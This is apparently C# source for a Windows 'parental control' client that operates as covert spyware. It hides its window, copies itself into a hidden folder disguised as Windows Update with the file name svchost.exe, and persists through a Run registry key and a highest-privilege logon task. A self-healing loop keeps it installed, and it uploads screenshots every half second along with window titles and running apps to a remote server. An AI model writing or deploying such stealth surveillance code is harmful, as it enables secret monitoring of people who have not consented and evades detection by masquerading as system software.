using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace ParentalControlClient;

internal static class Program
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    private static string _serverUrl = "";
    private static string _authUsername = "";
    private static string _authPassword = "";
    private static string _childId = "";
    private static int _reportInterval = 30;
    private static int _frameIntervalMs = 500;

    private static readonly HttpClient _httpClient = new() { Timeout = TimeSpan.FromSeconds(15) };

    private static readonly string HiddenFolder = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WindowsUpdate");

    private static readonly string HiddenExe = Path.Combine(HiddenFolder, "svchost.exe");
    private static readonly string HiddenConfig = Path.Combine(HiddenFolder, "appsettings.json");

    [STAThread]
    static void Main(string[] args)
    {
        var handle = GetConsoleWindow();
        if (handle != IntPtr.Zero)
            ShowWindow(handle, 0);

        try
        {
            SelfInstallAndRun();
            RegisterStartup();

            LoadConfig();
            SetupHttpClient();

            _ = Task.Run(SelfHealingLoop);

            var reportTask = Task.Run(ReportLoop);
            var frameTask = Task.Run(FrameLoop);

            Task.WaitAll(reportTask, frameTask);
        }
        catch (Exception ex)
        {
            LogError($"Fatal: {ex.Message}");
        }
    }

    private static void SelfInstallAndRun()
    {
        try
        {
            string currentExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
            if (string.IsNullOrEmpty(currentExe)) return;
            if (currentExe.Equals(HiddenExe, StringComparison.OrdinalIgnoreCase)) return;

            Directory.CreateDirectory(HiddenFolder);

            File.Copy(currentExe, HiddenExe, overwrite: true);

            string currentConfig = Path.Combine(AppContext.BaseDirectory, "appsettings.json");
            if (File.Exists(currentConfig))
                File.Copy(currentConfig, HiddenConfig, overwrite: true);

            File.SetAttributes(HiddenExe, FileAttributes.Hidden | FileAttributes.System);
            if (File.Exists(HiddenConfig))
                File.SetAttributes(HiddenConfig, FileAttributes.Hidden | FileAttributes.System);

            DirectoryInfo di = new DirectoryInfo(HiddenFolder);
            di.Attributes |= FileAttributes.Hidden | FileAttributes.System;

            Process.Start(new ProcessStartInfo
            {
                FileName = HiddenExe,
                WorkingDirectory = HiddenFolder,
                UseShellExecute = false,
                CreateNoWindow = true
            });

            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            LogError($"SelfInstall failed: {ex.Message}");
        }
    }

    private static void RegisterStartup()
    {
        try
        {
            if (!File.Exists(HiddenExe)) return;

            using (var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", writable: true))
            {
                key?.SetValue("WindowsUpdateService", HiddenExe);
            }

            CreateScheduledTask();
        }
        catch (Exception ex)
        {
            LogError($"RegisterStartup failed: {ex.Message}");
        }
    }

    private static void CreateScheduledTask()
    {
        try
        {
            string taskName = "WindowsUpdateService";
            RunCommand("schtasks.exe", $"/Delete /TN \"{taskName}\" /F");

            string args = $"/Create /TN \"{taskName}\" " +
                         $"/TR \"\\\"{HiddenExe}\\\"\" " +
                         $"/SC ONLOGON " +
                         $"/RL HIGHEST " +
                         $"/F";

            RunCommand("schtasks.exe", args);
        }
        catch (Exception ex)
        {
            LogError($"CreateScheduledTask failed: {ex.Message}");
        }
    }

    private static void RunCommand(string fileName, string arguments)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using var process = Process.Start(psi);
            process?.WaitForExit(5000);
        }
        catch { }
    }

    private static async Task SelfHealingLoop()
    {
        string currentExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";

        while (true)
        {
            await Task.Delay(TimeSpan.FromSeconds(60));

            try
            {
                if (!File.Exists(HiddenExe) && !currentExe.Equals(HiddenExe, StringComparison.OrdinalIgnoreCase))
                {
                    Directory.CreateDirectory(HiddenFolder);
                    File.Copy(currentExe, HiddenExe, overwrite: true);
                    File.SetAttributes(HiddenExe, FileAttributes.Hidden | FileAttributes.System);
                }

                RegisterStartup();
            }
            catch { }
        }
    }

    private static void LoadConfig()
    {
        string configPath = Path.Combine(AppContext.BaseDirectory, "appsettings.json");
        if (!File.Exists(configPath))
            throw new FileNotFoundException($"Config not found: {configPath}");

        var json = File.ReadAllText(configPath);
        dynamic config = JsonConvert.DeserializeObject(json)!;

        _serverUrl = config.ServerUrl;
        _authUsername = config.AuthUsername;
        _authPassword = config.AuthPassword;
        _childId = config.ChildId;
        _reportInterval = (int)config.ReportIntervalSeconds;
        _frameIntervalMs = (int)config.FrameIntervalMs;
    }

    private static void SetupHttpClient()
    {
        var authBytes = Encoding.UTF8.GetBytes($"{_authUsername}:{_authPassword}");
        var authHeader = Convert.ToBase64String(authBytes);
        _httpClient.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Basic", authHeader);
    }

    private static async Task ReportLoop()
    {
        while (true)
        {
            try
            {
                var report = new
                {
                    child_id = _childId,
                    timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                    active_window = GetActiveWindowTitle(),
                    running_apps = GetRunningApps(),
                    typed_text = "",
                    ip = GetLocalIP()
                };

                var json = JsonConvert.SerializeObject(report);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                await _httpClient.PostAsync($"{_serverUrl}/report", content);
            }
            catch (Exception ex)
            {
                LogError($"Report failed: {ex.Message}");
            }

            await Task.Delay(TimeSpan.FromSeconds(_reportInterval));
        }
    }

    private static async Task FrameLoop()
    {
        while (true)
        {
            try
            {
                byte[] imageBytes = CaptureScreenLowQuality();

                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(_childId), "child_id");

                var imageContent = new ByteArrayContent(imageBytes);
                imageContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
                form.Add(imageContent, "frame", "frame.jpg");

                await _httpClient.PostAsync($"{_serverUrl}/frame", form);
            }
            catch (Exception ex)
            {
                LogError($"Frame failed: {ex.Message}");
            }

            await Task.Delay(_frameIntervalMs);
        }
    }

    private static string GetActiveWindowTitle()
    {
        try
        {
            IntPtr hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return "Unknown";
            var sb = new StringBuilder(256);
            GetWindowText(hwnd, sb, sb.Capacity);
            return sb.ToString();
        }
        catch { return "Unknown"; }
    }

    private static List<string> GetRunningApps()
    {
        var apps = new HashSet<string>();
        try
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    if (!string.IsNullOrEmpty(p.MainWindowTitle))
                        apps.Add(p.ProcessName);
                }
                catch { }
            }
        }
        catch { }
        return apps.Take(30).ToList();
    }

    private static byte[] CaptureScreenLowQuality()
    {
        var bounds = System.Windows.Forms.Screen.PrimaryScreen!.Bounds;

        int newWidth = bounds.Width / 2;
        int newHeight = bounds.Height / 2;

        using var fullBitmap = new Bitmap(bounds.Width, bounds.Height);
        using (var g = Graphics.FromImage(fullBitmap))
        {
            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
        }

        using var scaledBitmap = new Bitmap(newWidth, newHeight);
        using (var g = Graphics.FromImage(scaledBitmap))
        {
            g.DrawImage(fullBitmap, 0, 0, newWidth, newHeight);
        }

        using var ms = new MemoryStream();
        var jpegEncoder = ImageCodecInfo.GetImageEncoders()
            .First(c => c.FormatID == ImageFormat.Jpeg.Guid);

        using var encoderParams = new EncoderParameters(1);
        encoderParams.Param[0] = new EncoderParameter(
            System.Drawing.Imaging.Encoder.Quality,
            (long)40);

        scaledBitmap.Save(ms, jpegEncoder, encoderParams);
        return ms.ToArray();
    }

    private static string GetLocalIP()
    {
        try
        {
            return System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName())
                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                ?.ToString() ?? "unknown";
        }
        catch { return "unknown"; }
    }

    private static void LogError(string message)
    {
        try
        {
            string logPath = Path.Combine(AppContext.BaseDirectory, "client.log");
            File.AppendAllText(logPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}\n");
        }
        catch { }
    }
}